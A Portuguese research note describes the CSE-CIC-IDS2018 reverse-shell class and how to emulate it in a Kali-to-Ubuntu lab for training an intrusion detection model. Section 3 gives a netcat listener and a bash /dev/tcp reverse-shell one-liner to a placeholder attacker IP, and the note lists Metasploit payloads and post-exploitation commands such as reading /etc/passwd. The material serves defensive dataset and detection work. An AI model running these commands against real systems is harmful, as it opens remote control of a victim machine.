# Infiltration - Communication Victim Attacker

- **Classe no CSE-CIC-IDS2018:** `Infiltration - Communication Victim Attacker`
- **Volume no Dataset Corrigido:** 204 fluxos (classe minoritária estrita mantida 100% na amostragem)
- **Camada OSI:** Camada 7 / Camada 4 (Tráfego de Shell Reverso Interativo sobre TCP)
- **Alvo no Laboratório:** Canal de comunicação bidirecional Kali $\leftrightarrow$ Ubuntu ([[Atacante e Vítima]])
- **Status de Reprodução:** Emulável via Reverse Shell (Pós-Exploração)

---

## 1. Ferramenta no Kali Linux

- **Ferramenta Principal no Kali:** `metasploit-framework` (`msfconsole` com payload `linux/x64/shell_reverse_tcp` ou `meterpreter/reverse_tcp`)
- **Alternativas Leves Nativas:** `netcat` (`nc`), `pwncat`, `socat`
- **Verificação no Kali:**
  ```bash
  which nc msfconsole
  ```

---

## 2. Como a Ferramenta Realiza o Ataque

Essa classe representa a **fase de comando e controle interativo pós-comprometimento** (*Post-Exploitation C2*):

1. **Estabelecimento de Conexão Reversa (Reverse Shell):**
   Ao invés de o atacante conectar diretamente na vítima (o que seria barrado por NAT e firewalls de entrada), a máquina vítima comprometida inicia uma conexão TCP de saída (*outbound*) para o endereço IP e porta onde o atacante deixou um ouvinte (*listener*) aberto no Kali Linux.
2. **Canal de Terminal Interativo:**
   Uma vez completado o handshake TCP de 3 vias, a máquina vítima redireciona os descritores de entrada e saída padrão (`stdin`, `stdout`, `stderr`) de um processo de shell (ex.: `/bin/bash` ou `/bin/sh`) diretamente para o socket de rede conectado ao Kali.
3. **Dinâmica de Operação Humana:**
   O atacante no Kali digita comandos interativos no terminal (ex.: `whoami`, `id`, `uname -a`, `ls -la`, `cat /etc/passwd`). O tráfego na rede reflete a digitação manual de comandos curtos intercalados por tempo de leitura e respostas em texto plano ou frames binários (no caso de payloads avançados como o Meterpreter).

---

## 3. Modo de Execução no Testbed (Kali $\leftrightarrow$ Ubuntu)

```bash
# 1. No Atacante (Kali Linux) - Inicia o listener de escuta
nc -lvnp 4444

# 2. Na Vítima (Ubuntu) - Executa a conexão reversa emulando a pós-exploração
bash -i >& /dev/tcp/[IP_KALI]/4444 0>&1
```

- `-l`: Modo listen (escuta conexões de entrada).
- `-v`: Modo verboso.
- `-n`: Não resolve nomes DNS para evitar atrasos.
- `-p 4444`: Porta TCP escolhida para o canal de C2.

---

## 4. Assinatura e Impacto nas Features do NIDS (ALF-MoE)

Por ser uma sessão de terminal interativo com operador humano, o padrão estatístico é radicalmente distinto de bots e scripts automatizados:

| Feature de Fluxo | Comportamento Observado | Justificativa Operacional |
| :--- | :---: | :--- |
| `Flow Duration` | **Longo** | A conexão permanece aberta enquanto durar a sessão interativa. |
| `Flow IAT Mean` / `Flow IAT Std` | **Elevado e Variável** | Reflete os intervalos de digitação e pausa humana (tempo de raciocínio entre comandos). |
| `Flow Packets/s` | **Muito Baixo** | Poucos pacotes por segundo (apenas quando comandos são transmitidos). |
| `Packet Length Mean` | **Pequeno** | Pacotes contendo comandos em texto ou pequenas respostas de stdout. |
| `PSH Flag Count` | **Frequente** | Cada comando digitado ativa o flag PSH para empurrar o texto imediatamente para o socket. |
| `Active Mean` vs `Idle Mean` | **Idle Mean Altíssimo** | Longos períodos de silêncio na rede com rajadas pontuais de atividade. |

---

## 5. Relação com outras Notas

- [[00 - Mapeamento de Ataques Kali Linux]]
- [[Infiltration - NMAP Portscan]]
- [[Infiltration - Dropbox Download]]
- [[Botnet - Ares]]
- [[Atacante e Vítima]]
